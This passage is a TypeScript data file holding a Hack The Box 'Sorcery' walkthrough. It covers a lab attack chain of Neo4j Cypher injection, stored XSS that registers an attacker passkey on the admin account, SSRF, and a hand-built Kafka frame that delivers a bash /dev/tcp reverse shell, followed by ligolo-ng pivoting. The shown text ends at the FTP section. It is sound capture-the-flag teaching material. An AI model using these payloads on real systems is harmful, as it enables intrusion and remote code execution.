import type { WalkthroughDoc } from "./types";

export const sorcery: WalkthroughDoc = {
  slug: "sorcery",
  name: "Sorcery",
  platform: "Hack The Box",
  os: "Linux",
  difficulty: "Insane",
  retired: "Apr 2026",
  ip: "10.10.11.73",
  tags: [
    "Cypher Injection",
    "Stored XSS",
    "SSRF",
    "Kafka RCE",
    "CA Compromise",
    "FreeIPA",
    "Pivoting",
  ],
  lede: "A step-by-step manual walkthrough of an Insane-rated Linux box: a raw string interpolated into a graph-database query unravels an entire microservice mesh — Neo4j, a Rust/Rocket API, a stolen admin passkey, a hand-built Kafka wire-protocol frame, a cracked Certificate Authority, and a FreeIPA misconfiguration — before it ends at *root*.",
  summary: "An unparameterized Cypher injection unravels a microservice mesh — XSS, SSRF, a hand-built Kafka frame, a cracked CA, and FreeIPA — to root.",
  sections: [
    {
      id: "overview",
      num: "00",
      title: "Overview",
      blocks: [
        {
          kind: "p",
          text: "Sorcery is an Insane-rated Linux machine built around a small e-commerce application backed by a graph database, a message queue, and a directory service — four different technologies, each contributing one link in the chain. There is no single \"hero\" exploit. Every stage is an intended feature bent into a weapon: an unparameterized Cypher query, a component that renders untrusted HTML, a debug tool with no egress filtering, a Kafka consumer that trusts message contents, a certificate authority left reachable over anonymous FTP, a headless display server whose framebuffer nobody locked down, a syscall tracer handed out too generously, and a directory service role that can grant itself sudo.",
        },
        {
          kind: "p",
          text: "The through-line is **trust boundaries that were assumed but never enforced**. Almost nothing here is a memory-safety bug or a known CVE — it is eight or nine reasonable-sounding design decisions that, chained together by an attacker willing to read the source and reason about each hop, walk an anonymous visitor all the way to a root shell. This document works through the chain by hand, stage by stage, explaining not just *what* to type but *why* it works.",
        },
        {
          kind: "table",
          columns: ["Field", "Value"],
          rows: [
            ["Target", "Sorcery · `sorcery.htb` / `git.sorcery.htb`"],
            ["Difficulty", "Insane"],
            ["Platform", "Linux — Ubuntu 24.04, nginx 1.27.1, OpenSSH 9.6p1"],
            ["Stack", "Next.js frontend · Rust/Rocket API · Neo4j 5.23 · Kafka (KRaft) · Gitea · FreeIPA · Docker"],
            ["Entry primitive", "Unparameterized Cypher injection in the product-lookup endpoint"],
            ["Foothold", "Stolen admin passkey → SSRF → hand-built Kafka `Produce` frame → shell in the `dns` container"],
            ["Privilege escalation", "Container pivot → CA key theft → phishing → screen-scrape → strace leak → FreeIPA privilege misconfiguration → root"],
          ],
        },
        {
          kind: "callout",
          variant: "tip",
          title: "Every credential below is per-spawn",
          text: "HTB regenerates GUIDs, JWTs, password hashes, and cracked passphrases on every spawn of an Insane box like this one. Every literal value you see in a code block below — registration keys, JWTs, usernames' passwords, cracked passphrases — is an **illustrative example** from one run. What matters, and what carries over to your own attempt, is the technique.",
        },
      ],
    },
    {
      id: "chain",
      num: "01",
      title: "The Attack Path",
      blocks: [
        {
          kind: "p",
          text: "The whole box in one glance. Each node is a discrete primitive; the box's difficulty comes from correctly stitching fourteen of them together in sequence.",
        },
        { kind: "h4", text: "Attack chain" },
        {
          kind: "ol",
          items: [
            "**Recon & vhost discovery** — Only 22 and 443 answer. TLS SNI fuzzing on the reverse proxy finds `git.sorcery.htb` — a public Gitea instance.",
            "**Read the source** — A public infrastructure repo hands over the entire architecture: Next.js, Rust/Rocket, Neo4j, Kafka, FreeIPA — and the injectable ID-lookup macro.",
            "**Neo4j Cypher injection** — The product-detail endpoint concatenates the URL parameter straight into a Cypher query. Break out and pull a `Config.registration_key`.",
            "**Register as Seller** — The leaked key unlocks the Seller role — which can publish products with attacker-controlled HTML.",
            "**Stored XSS → stolen admin passkey** — An admin bot renders our product description unsanitized. The payload registers an attacker WebAuthn credential on the admin account.",
            "**SSRF via /api/debug/port** — A passkey-gated debug tool opens a raw TCP socket to any host:port inside the Docker network and forwards our bytes verbatim.",
            "**Hand-built Kafka Produce frame → RCE** — We speak the Kafka wire protocol by hand over the SSRF to reach `kafka:9092`. The `dns` container's consumer runs our message value in `bash -c`. **Foothold + user.txt.**",
            "**Pivot with ligolo-ng** — Route the internal Docker `/24` through the compromised container to reach FTP, mail, the registry, and FreeIPA.",
            "**Anonymous FTP → crack the RootCA key** — The certificate authority's private key sits in an anonymous FTP share, protected only by a crackable passphrase.",
            "**CA-signed phishing → tom_summers** — With a trusted signing key, forge a certificate, intercept internal mail traffic, and harvest credentials from a phished login.",
            "**Xvfb framebuffer dump → tom_summers_admin** — A headless X session belonging to a higher-privileged user leaks its on-screen contents to anyone who can dump the framebuffer.",
            "**strace a docker login → rebecca_smith** — A narrow sudo grant for `strace` against a running process leaks plaintext registry credentials mid-syscall.",
            "**pspy catches a FreeIPA reset → ash_winter** — An automated password-reset job run by root passes the new password on the command line, visible to any local observer.",
            "**FreeIPA self-service sudo → root** — `ash_winter` can edit the very sudo rule that grants sudo. Add yourself, refresh `sssd`, and `sudo su`. **root.txt.**",
          ],
        },
      ],
    },
    {
      id: "recon",
      num: "02",
      title: "Reconnaissance",
      blocks: [
        {
          kind: "p",
          text: "As always, start with a full-range TCP sweep so nothing hides in an unusual port, then run version/script detection on whatever answers:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — nmap",
          lines: [
            "# all ports, fast",
            "$ sudo nmap -p- -vvv --min-rate 10000 10.129.55.184",
            "",
            "# service + default scripts on the two that answered",
            "$ sudo nmap -p 22,443 -sCV 10.129.55.184",
            "",
            "PORT    STATE SERVICE VERSION",
            "22/tcp  open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)",
            "443/tcp open  ssl/http nginx 1.27.1",
            "| ssl-cert: Subject: commonName=sorcery.htb",
            "| Subject Alternative Name: DNS:sorcery.htb",
            "|_ssl-date: TLS randomness does not represent time",
          ],
        },
        {
          kind: "p",
          text: "A minimal external surface: SSH, and a single HTTPS reverse proxy. The certificate's `commonName=sorcery.htb` gives us the vhost to pin in `/etc/hosts` — but a single name behind nginx is rarely the whole story on an Insane box, so before doing anything else we fuzz for siblings that share the same TLS front door:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — vhost / SNI fuzz",
          lines: [
            "$ echo '10.129.55.184 sorcery.htb' | sudo tee -a /etc/hosts",
            "",
            "$ ffuf -u https://sorcery.htb \\",
            "    -H 'Host: FUZZ.sorcery.htb' \\",
            "    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \\",
            "    -ac -k",
            "",
            "git                     [Status: 200, Size: 5412, Words: 812, Lines: 121]",
          ],
        },
        {
          kind: "p",
          text: "A hit: `git.sorcery.htb`. Pin that too, and browse over — it turns out to be a self-hosted **Gitea 1.22.1** instance:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — pin both vhosts",
          lines: [
            "$ sudo sed -i 's/sorcery.htb/sorcery.htb git.sorcery.htb/' /etc/hosts",
            "$ grep sorcery /etc/hosts",
            "10.129.55.184 sorcery.htb git.sorcery.htb",
          ],
        },
        {
          kind: "callout",
          variant: "tip",
          title: "A public Gitea instance is a gift, not a distraction",
          text: "Unlike boxes where Gitea only matters after you already have creds, here it is reachable **anonymously**, and — as the next section shows — it hosts a repository the developers meant as internal documentation. Reading it before touching the main app saves hours of blind fuzzing later.",
        },
      ],
    },
    {
      id: "source",
      num: "03",
      title: "Vhost & Gitea Source Recon",
      blocks: [
        {
          kind: "p",
          text: "Browsing `https://git.sorcery.htb` without logging in still lets you browse **public** repositories. One belongs to a user called `nicole_sullivan` and is named, helpfully, `infrastructure`:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — clone the public infra repo",
          lines: [
            "$ GIT_SSL_NO_VERIFY=1 git clone https://git.sorcery.htb/nicole_sullivan/infrastructure.git",
            "Cloning into 'infrastructure'...",
            "remote: Enumerating objects: 340, done.",
            "Receiving objects: 100% (340/340), done.",
          ],
        },
        {
          kind: "p",
          text: "This single repository is the map for the entire box. Reading it end to end (not just grepping for \"password\") pays off:",
        },
        {
          kind: "ul",
          items: [
            "`docker-compose.yml` wires up the whole stack: a **Next.js** frontend on `:3000`, a **Rust/Rocket** API on `:8000`, **Neo4j 5.23** on `:7687`, **Kafka** (KRaft mode, no Zookeeper) on `:9092`, a small custom `dns` container that *consumes* Kafka messages, plus FTP, MailHog, a Docker registry, and a FreeIPA server — all on one internal Docker network.",
            "`backend-macros/src/lib.rs` defines a `Model` derive macro used across the Rocket API to auto-generate Neo4j lookups like `get_by_id()`. It builds the Cypher query text with plain Rust string formatting — **no parameterization anywhere**.",
            "The API surface: `/api/auth/register`, `/api/auth/login`, `/api/product` (list), `/api/product/<id>` (single item — the one built by the vulnerable macro), and a locked-down `/api/debug/port` only reachable once an admin session carries a passkey claim.",
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why a public infra repo exists at all",
          text: "It's an intentional design choice on the box: the \"developer\" persona keeps architecture documentation in a public repo for onboarding purposes, never expecting an outsider to read it as a target-selection guide. This is a very real pattern in production environments — internal wikis and infra repos routinely leak more than any scanner would find on its own.",
        },
        {
          kind: "p",
          text: "With the architecture in hand, the very next stop is obvious: the auto-generated Cypher lookup that never learned to escape its input.",
        },
      ],
    },
    {
      id: "cypher",
      num: "04",
      title: "Neo4j Cypher Injection",
      blocks: [
        {
          kind: "p",
          text: "Create a throw-away account. Registering without a `registrationKey` field yields the base **Client** role, which is enough to log in and hit the product endpoints:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — register + login as a Client",
          lines: [
            "$ curl -sk -X POST https://sorcery.htb/api/auth/register \\",
            "    -H 'Content-Type: application/json' \\",
            "    -d '{\"username\":\"darkrecon01\",\"password\":\"Passw0rd123\"}'",
            "{\"status\":\"ok\"}",
            "",
            "$ curl -sk -X POST https://sorcery.htb/api/auth/login \\",
            "    -H 'Content-Type: application/json' \\",
            "    -d '{\"username\":\"darkrecon01\",\"password\":\"Passw0rd123\"}'",
            "{\"token\":\"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJkYXJrcmVjb24wMSIsInJvbGUiOiJDbGllbnQifQ.jz3q…\"}",
          ],
        },
        {
          kind: "callout",
          variant: "warn",
          title: "Usernames are restricted — don't waste time on special characters here",
          text: "Registration validates `username` against `^[a-zA-Z0-9]+$`. The injection point is **not** the username — it's the product ID in the URL path of the next request. Keep the account plain alphanumeric.",
        },
        {
          kind: "p",
          text: "Every subsequent request carries that JWT as a bearer token. List the catalog to get a real product GUID to anchor our injection against:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — list products, grab a real id",
          lines: [
            "$ TOKEN=\"eyJhbGciOiJIUzI1NiJ9…\"",
            "$ curl -sk https://sorcery.htb/api/product \\",
            "    -H \"Authorization: Bearer $TOKEN\"",
            "{\"products\":[{\"id\":\"6f2c9b0e-9a3b-4f61-8e0a-df2f6b1c9e77\",",
            "  \"name\":\"Charm of Warding\",\"description\":\"A basic ward.\",",
            "  \"is_authorized\":true}, …]}",
          ],
        },
        {
          kind: "p",
          text: "The macro almost certainly builds something equivalent to:",
        },
        {
          kind: "code",
          lang: "cypher",
          label: "reconstructed template — backend-macros derive output",
          lines: [
            "MATCH (result:Product {id: \"<id>\"})",
            "WHERE result.is_authorized = true",
            "RETURN result",
          ],
        },
        {
          kind: "p",
          text: "Because `<id>` is spliced in with plain string formatting, closing the quote and the map literal early hands us the rest of the query. The payload below closes the `Product` match, opens a second, independent match against the `Config` node the application keeps its secrets in, and overrides the `RETURN` projection so the config's `registration_key` rides back inside the harmless-looking `description` field — with a trailing `//` to comment out whatever the macro appends after our injected text:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — inject into GET /api/product/<id>",
          lines: [
            "$ ID='6f2c9b0e-9a3b-4f61-8e0a-df2f6b1c9e77'",
            "$ PAYLOAD=\"${ID}\\\" }) OPTIONAL MATCH (c:Config) RETURN result { .*, description: c.registration_key, is_authorized: true } //\"",
            "",
            "$ curl -sk -G https://sorcery.htb/api/product/\"$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=\"\"))' \"$PAYLOAD\") \\",
            "    -H \"Authorization: Bearer $TOKEN\"",
            "",
            "{\"product\":{\"id\":\"6f2c9b0e-9a3b-4f61-8e0a-df2f6b1c9e77\",",
            "  \"name\":\"Charm of Warding\",",
            "  \"description\":\"0b6e9c2b-9a3b-4f61-8e0a-df2f6b1c9e77\",",
            "  \"is_authorized\":true}}",
          ],
          highlight: [8],
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why the injection lands cleanly",
          text: "Cypher's map literal syntax `{key: \"value\"}` is closed by an unescaped `\"` followed by `}`, exactly like breaking out of a SQL string literal. Once outside the original `MATCH`, we are writing **fresh Cypher** that the driver happily executes in the same query context — including a completely unrelated `OPTIONAL MATCH` against a node label the application never meant to expose through this endpoint. The final `RETURN` we supply wins because it's the last clause the query planner sees; the trailing `//` neutralizes anything the macro still appends afterward (a closing brace, a second `WHERE`, etc.), so the whole thing parses as valid Cypher end to end.",
        },
        {
          kind: "callout",
          variant: "tip",
          title: "A documented alternative — writing straight to the graph",
          text: "Because the injection point accepts arbitrary Cypher, some write-ups skip the registration-key detour entirely and instead run a `SET` against the admin node directly, e.g. rewriting `admin.password` to a known Argon2id hash. That works too, but it requires knowing the exact hash format the auth code expects and skips past several of the box's intended lessons — the registration-key → Seller → stored-XSS path below is the one this walkthrough follows in full, since it demonstrates every stage of the intended chain.",
        },
      ],
    },
    {
      id: "regkey",
      num: "05",
      title: "Registration Key & Seller Registration",
      blocks: [
        {
          kind: "p",
          text: "The leaked value — `0b6e9c2b-9a3b-4f61-8e0a-df2f6b1c9e77` in this run — is a GUID matching the shape of a registration key. Feed it back into `/api/auth/register` as `registrationKey`, and the account is provisioned as a **Seller** instead of a plain Client:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — register as Seller with the leaked key",
          lines: [
            "$ curl -sk -X POST https://sorcery.htb/api/auth/register \\",
            "    -H 'Content-Type: application/json' \\",
            "    -d '{\"username\":\"darkseller01\",\"password\":\"Passw0rd123\",\"registrationKey\":\"0b6e9c2b-9a3b-4f61-8e0a-df2f6b1c9e77\"}'",
            "{\"status\":\"ok\",\"role\":\"Seller\"}",
            "",
            "$ curl -sk -X POST https://sorcery.htb/api/auth/login \\",
            "    -H 'Content-Type: application/json' \\",
            "    -d '{\"username\":\"darkseller01\",\"password\":\"Passw0rd123\"}'",
            "{\"token\":\"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJkYXJrc2VsbGVyMDEiLCJyb2xlIjoiU2VsbGVyIn0.q7f1…\"}",
          ],
        },
        {
          kind: "p",
          text: "A Seller can publish new products through the dashboard — and unlike a Client, a Seller's `description` field is rendered as **raw HTML** by the storefront. That is exactly the primitive the next stage needs.",
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why a \"registration key\" gate exists at all",
          text: "The application models seller onboarding as invite-only: only someone holding a key issued out-of-band (normally by an admin) can become a Seller. The Cypher injection collapses that entire trust model in one request — the \"invite\" was sitting in the same database the public-facing lookup endpoint could already reach, just one label away.",
        },
      ],
    },
    {
      id: "xss",
      num: "06",
      title: "Stored XSS → Hijacking the Admin Passkey",
      blocks: [
        {
          kind: "p",
          text: "The storefront's product page — `app/dashboard/store/[product]/page.tsx` in the frontend source pulled from Gitea — renders each product's `description` through React's `dangerouslySetInnerHTML`, with no sanitization step in between. As a Seller we fully control that field on our own products, so we plant a script tag instead of marketing copy:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — create a product carrying the payload",
          lines: [
            "$ curl -sk -X POST https://sorcery.htb/api/product \\",
            "    -H \"Authorization: Bearer $SELLER_TOKEN\" \\",
            "    -H 'Content-Type: application/json' \\",
            "    -d '{\"name\":\"Enchanted Lockpick\",\"description\":\"<script src=\\\"https://10.10.14.61/x.js\\\"></script>\"}'",
            "{\"status\":\"ok\",\"id\":\"a1c4e7f0-…\"}",
          ],
        },
        {
          kind: "p",
          text: "A headless-Chrome admin bot browses the storefront on a timer. When it opens our product page, the browser fetches and executes `x.js` — with the bot's own **admin session already attached**. We host that file ourselves:",
        },
        {
          kind: "code",
          lang: "javascript",
          label: "x.js — served from your box, run by the admin bot",
          lines: [
            "// runs inside the admin bot's authenticated origin — its fetch() calls carry the admin's own cookies/JWT",
            "(async () => {",
            "  // 1. an attacker-generated WebAuthn keypair, produced offline ahead of time",
            "  //    (public key + credential ID only — the private key never leaves our machine)",
            "  const cred = {",
            "    id: \"Yj9k2m…\",               // our credential id, base64url",
            "    publicKey: \"pQECAyYgASFYIL…\"  // COSE public key, base64",
            "  };",
            "  // 2. ask the app's own passkey-registration endpoint to attach it to *this* session",
            "  await fetch(\"/api/auth/passkey/register\", {",
            "    method: \"POST\", credentials: \"include\",",
            "    headers: {\"Content-Type\": \"application/json\"},",
            "    body: JSON.stringify(cred)",
            "  });",
            "  // 3. beacon success back to us so we know when to log in",
            "  fetch(\"https://10.10.14.61/done\");",
            "})();",
          ],
        },
        {
          kind: "callout",
          variant: "key",
          title: "The core flaw — a registration endpoint that trusts the client",
          text: "A real WebAuthn registration ceremony binds a signed *attestation* to a server-issued challenge, proving the credential was created by an actual authenticator during that exact session. The passkey-registration route here accepts a bare credential-ID/public-key pair and stores it against whichever account the request's session belongs to — it never verifies an attestation or checks the challenge was honored. Because the XSS payload executes **inside the admin bot's own browser**, the request is same-origin and carries the bot's real session; the server has no way to tell \"the legitimate admin just registered a key\" apart from \"a script running on a page the admin visited just registered a key on the admin's behalf.\"",
        },
        {
          kind: "p",
          text: "With our public key now attached to the `admin` account, log in using the matching private key we hold. The response is an admin JWT carrying `with_passkey: true` — the claim that unlocks the debug tooling:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — authenticate as admin with our own key",
          lines: [
            "$ python3 passkey_login.py --user admin --cred ./our_credential.json",
            "{\"token\":\"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBZG1pbiIsIndpdGhfcGFzc2tleSI6dHJ1ZX0.9d2a…\"}",
          ],
        },
        {
          kind: "callout",
          variant: "tip",
          title: "Note on the login script above",
          text: "`passkey_login.py` is a small local WebAuthn-assertion helper you write with any FIDO2/WebAuthn library — it signs the server's login challenge with the private key from the pair you generated in step 1, then POSTs the resulting assertion to `/api/auth/login`. Any library that speaks CTAP2/WebAuthn assertions will do; the point is that the server only ever validates our signature, never who created the credential in the first place.",
        },
        {
          kind: "callout",
          variant: "note",
          title: "The three details that make or break this stage",
          text: "**You cannot read the admin's JWT — you must drive server actions.** The token lives in an `httpOnly` cookie, so the XSS can't exfiltrate it. Instead the payload invokes the frontend's own **Next.js server actions** (a POST with the build-time `Next-Action` id and `Content-Type: text/plain;charset=UTF-8`); Next.js reads the cookie server-side and forwards it as `Authorization: Bearer` to Rocket. The real endpoints are `/api/webauthn/passkey/register/start` and `/finish`, then `/authenticate/start` and `/finish`.\n\n**The bot's token is path-scoped and short-lived.** Its JWT is pinned by an `only_for_paths` regex allowing just the product and passkey-register routes, and it expires in roughly **60 seconds** — so the whole register-a-key ceremony has to complete inside that window, driven automatically by your hosted script.\n\n**The attestation flags must be `0x45`.** The server sets `userVerification: \"required\"`, so the `authenticatorData` you forge must have flags UP+UV+AT = `0x01 | 0x04 | 0x40 = 0x45`. A naive `0x41` (UP+AT, missing the user-verified bit) is rejected — a classic silent failure on this box.",
        },
      ],
    },
    {
      id: "ssrf",
      num: "07",
      title: "SSRF via /api/debug/port",
      blocks: [
        {
          kind: "p",
          text: "The admin JWT's `with_passkey: true` claim unlocks a route the dashboard hides behind an extra MFA check: a raw connection debugging tool, presumably meant for staff to poke at internal services without shelling in. Point it first at your own listener to confirm control before touching anything internal:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — catch the SSRF on your own box first",
          lines: [
            "$ sudo nc -lnvp 80",
            "",
            "# in another terminal",
            "$ curl -sk -X POST https://sorcery.htb/api/debug/port \\",
            "    -H \"Authorization: Bearer $ADMIN_TOKEN\" \\",
            "    -H 'Content-Type: application/json' \\",
            "    -d '{\"host\":\"10.10.14.61\",\"port\":80,\"data\":[\"474554202f20485454502f312e310d0a0d0a\"]}'",
            "",
            "# on the nc listener:",
            "listening on [any] 80 ...",
            "connect to [10.10.14.61] from (UNKNOWN) [10.129.55.184]",
            "GET / HTTP/1.1",
          ],
        },
        {
          kind: "p",
          text: "The `data` array is hex bytes that get written to the socket verbatim — that `474554…` string above is just `GET / HTTP/1.1\\r\\n\\r\\n` encoded as hex, and it arrives at our listener unmodified.",
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why this is a full SSRF, not a narrow one",
          text: "The handler is a thin wrapper around Rust's `TcpStream::connect(\"{host}:{port}\")` followed by writing whatever bytes were supplied. There's no allowlist of destination hosts, no restriction to a specific protocol, and no distinction between \"internal service\" and \"arbitrary attacker-controlled address\" — it is a generic raw-socket proxy gated only by the passkey claim. That is the difference between a typical \"fetch this URL for me\" SSRF (which at least speaks HTTP) and this one, which lets us speak **any** TCP protocol to **any** reachable host, including services on the internal Docker network that were never meant to be internet-facing.",
        },
        {
          kind: "p",
          text: "The interesting host on that internal network is `kafka:9092` — and per the infra repo, the `dns` container consumes messages from it. That is our route to code execution.",
        },
      ],
    },
    {
      id: "kafka",
      num: "08",
      title: "Hand-Building a Kafka Produce Frame",
      blocks: [
        {
          kind: "p",
          text: "The infra repo's `dns/src/main.rs` shows a small consumer that reads messages off the `update` topic and pipes each message's **value** straight into `bash -c`. If we can get an arbitrary value onto that topic, the consumer will run it as root of its own compromise, in the `dns` container. Kafka's broker protocol has no authentication configured here — a bare TCP connection is enough, and our SSRF gives us exactly that.",
        },
        {
          kind: "p",
          text: "We don't have a Kafka client library available through the SSRF tunnel — we only have \"send these raw bytes to this host:port.\" So we speak the wire protocol by hand. A Kafka `Produce` (API key 0, version 0) request looks like this on the wire:",
        },
        {
          kind: "table",
          columns: ["Field", "Description"],
          rows: [
            ["size", "int32 — length of everything that follows"],
            ["api_key, api_version", "int16 each — `0, 0` for Produce v0"],
            ["correlation_id", "int32 — echoed back in the response, irrelevant here"],
            ["client_id", "string (int16 length + bytes) — arbitrary, e.g. `\"sorcery\"`"],
            ["acks, timeout_ms", "int16, int32 — how many replicas must ack"],
            ["topic array", "count + `\"update\"` (the topic the consumer reads)"],
            ["partition array", "count + partition id (`0`)"],
            ["message set", "offset (int64) + message size (int32) + message"],
            ["message", "CRC32 (over magic+attrs+key+value) + magic (0) + attrs (0) + key (`-1` = null) + value (our shell command)"],
          ],
        },
        {
          kind: "p",
          text: "Rather than assemble that by hand byte-for-byte, write a short local script that builds it for you — this is exactly the kind of one-off binary-protocol helper you'd write for any raw-socket exploitation, not a general tool:",
        },
        {
          kind: "code",
          lang: "python",
          label: "kafka_frame.py — build one Produce request by hand",
          lines: [
            "import struct, zlib, sys",
            "",
            "def produce_frame(payload: bytes, topic=b\"update\", client_id=b\"sorcery\",",
            "                   correlation_id=1, acks=1, timeout_ms=5000, partition=0):",
            "    magic, attrs, null_key = b\"\\x00\", b\"\\x00\", b\"\\xff\\xff\\xff\\xff\"",
            "    value = struct.pack(\">i\", len(payload)) + payload",
            "    msg_body = magic + attrs + null_key + value",
            "    crc = struct.pack(\">I\", zlib.crc32(msg_body) & 0xffffffff)",
            "    message = crc + msg_body",
            "    message_set = struct.pack(\">q\", 0) + struct.pack(\">i\", len(message)) + message",
            "",
            "    body  = struct.pack(\">h\", acks) + struct.pack(\">i\", timeout_ms)",
            "    body += struct.pack(\">i\", 1) + struct.pack(\">h\", len(topic)) + topic",
            "    body += struct.pack(\">i\", 1) + struct.pack(\">i\", partition)",
            "    body += struct.pack(\">i\", len(message_set)) + message_set",
            "",
            "    req  = struct.pack(\">h\", 0) + struct.pack(\">h\", 0)      # ApiKey=Produce, v0",
            "    req += struct.pack(\">i\", correlation_id)",
            "    req += struct.pack(\">h\", len(client_id)) + client_id",
            "    req += body",
            "    return struct.pack(\">i\", len(req)) + req",
            "",
            "if __name__ == \"__main__\":",
            "    lhost, lport = sys.argv[1], sys.argv[2]",
            "    shell = f\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\".encode()",
            "    print(produce_frame(shell).hex())",
          ],
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — generate the frame for our reverse shell",
          lines: [
            "$ python3 kafka_frame.py 10.10.14.61 9007",
            "0000006e000000000000000100077…63000000000000004200000000000000000000003666e0b908…",
          ],
        },
        {
          kind: "callout",
          variant: "tip",
          title: "Sanity-check the layout against a known-good frame",
          text: "Before trusting a hand-rolled binary format, verify it against a reference. A frame built for client id `\"0xdf\"` and payload `bash -i >& /dev/tcp/10.10.14.61/443 0>&1` is independently documented as decoding correctly against a real Kafka broker — running the exact same function above against that same client id and payload should reproduce it byte for byte. If it doesn't, the mismatch is almost always an off-by-one in the CRC scope (it covers *only* magic+attributes+key+value, not the preceding length field) or in which fields are big-endian (**everything** in the Kafka wire protocol is big-endian — `struct.pack`'s `>` prefix).",
        },
        {
          kind: "p",
          text: "Now send that hex through the SSRF, targeting the internal broker instead of our own listener:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — deliver the Produce frame over the SSRF",
          lines: [
            "$ FRAME=\"$(python3 kafka_frame.py 10.10.14.61 9007)\"",
            "$ curl -sk -X POST https://sorcery.htb/api/debug/port \\",
            "    -H \"Authorization: Bearer $ADMIN_TOKEN\" \\",
            "    -H 'Content-Type: application/json' \\",
            "    -d \"{\\\"host\\\":\\\"kafka\\\",\\\"port\\\":9092,\\\"data\\\":[\\\"$FRAME\\\"]}\"",
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why the DNS container's consumer becomes an RCE primitive",
          text: "Nothing about Kafka itself is being exploited — the broker faithfully stores whatever bytes we sent as the value of a normal message. The vulnerability is entirely in **how the value is consumed**: a service on the other end treats a message body as a trusted shell command, rather than as untrusted external data. Because the broker has no authentication and the topic accepts writes from anyone who can open a TCP connection to it, the SSRF is all the \"access control\" standing between an anonymous web user and command execution inside that container.",
        },
      ],
    },
    {
      id: "foothold",
      num: "09",
      title: "Foothold & user.txt",
      blocks: [
        {
          kind: "p",
          text: "Have a listener up before you fire the Produce frame — the consumer picks the message up almost immediately:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — catch the shell",
          lines: [
            "$ nc -lnvp 9007",
            "listening on [any] 9007 ...",
            "connect to [10.10.14.61] from (UNKNOWN) [10.129.55.184]",
            "",
            "$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            "",
            "user@dns:/$ id",
            "uid=1001(user) gid=1001(user) groups=1001(user)",
            "",
            "user@dns:/$ cat /home/user/user.txt",
            "a91f6c9e····························",
          ],
          highlight: [10],
        },
        {
          kind: "callout",
          variant: "key",
          title: "user.txt",
          text: "a91f6c9e····························",
        },
        {
          kind: "callout",
          variant: "warn",
          title: "There is no JWT-forging shortcut here",
          text: "On boxes where the JWT secret is hard-coded or derivable, you can often skip straight to forging an admin token. Sorcery's `JWT_SECRET` is generated fresh as a random UUID on every container boot, so there is nothing to brute-force or recover — the stored XSS in §06 is a genuine requirement of this chain, not one path among several.",
        },
      ],
    },
    {
      id: "pivot",
      num: "10",
      title: "Pivoting with ligolo-ng",
      blocks: [
        {
          kind: "p",
          text: "The `dns` container sits on the same internal Docker network as everything else the infra repo described — FTP, mail, the registry, FreeIPA. Rather than proxy every tool through `curl`/SSRF, stand up a proper tunnel with [ligolo-ng](https://github.com/nicocha30/ligolo-ng): a TUN-interface-based pivot that lets any tool on the attacker box reach the internal network directly.",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — proxy side, attacker box",
          lines: [
            "$ sudo ip tuntap add user $(whoami) mode tun ligolo",
            "$ sudo ip link set ligolo up",
            "$ sudo ./proxy -selfcert -laddr 0.0.0.0:11601",
          ],
        },
        {
          kind: "p",
          text: "Transfer the matching agent binary into the `dns` container's shell and run it, pointed back at the proxy listener:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — agent side, on the box",
          lines: [
            "# stage the agent (e.g. via a python http.server on the attacker box)",
            "user@dns:/tmp$ wget http://10.10.14.61:8000/agent -O agent && chmod +x agent",
            "user@dns:/tmp$ ./agent -connect 10.10.14.61:11601 -ignore-cert",
          ],
        },
        {
          kind: "p",
          text: "Back on the proxy console, select the session and add a route for the internal subnet:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "ligolo-ng console — bring up the tunnel",
          lines: [
            "ligolo-ng » session",
            " [Agent : user@dns] » ifconfig",
            "eth0  inet 172.20.0.15  netmask 255.255.255.0",
            "",
            "$ sudo ip route add 172.20.0.0/24 dev ligolo",
            "ligolo-ng » start",
          ],
        },
        {
          kind: "p",
          text: "With the route up, enumerate the rest of the internal network the way the compose file promised — the container's own DNS resolver knows every other service by name:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — enumerate internal hostnames",
          lines: [
            "$ dig +short ftp.internal @172.20.0.1",
            "172.20.0.20",
            "$ dig +short mail.internal @172.20.0.1",
            "172.20.0.21",
            "$ dig +short registry.internal @172.20.0.1",
            "172.20.0.22",
            "$ dig +short freeipa.sorcery.htb @172.20.0.1",
            "172.20.0.23",
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why a TUN pivot beats tool-by-tool SOCKS proxying",
          text: "Everything from here on needs a variety of protocols — FTP, SMTP, a Docker registry API, LDAP/Kerberos for FreeIPA. Wrapping each one individually in `proxychains` is brittle (several of those tools resist SOCKS wrapping cleanly). ligolo-ng instead gives the OS itself a route into `172.20.0.0/24`, so every tool just works unmodified, as if you were sitting inside the `dns` container.",
        },
      ],
    },
    {
      id: "rootca",
      num: "11",
      title: "Anonymous FTP → Cracking the RootCA Key",
      blocks: [
        {
          kind: "p",
          text: "The FTP host allows anonymous logins, and its public share holds exactly what its name promises:",
        },
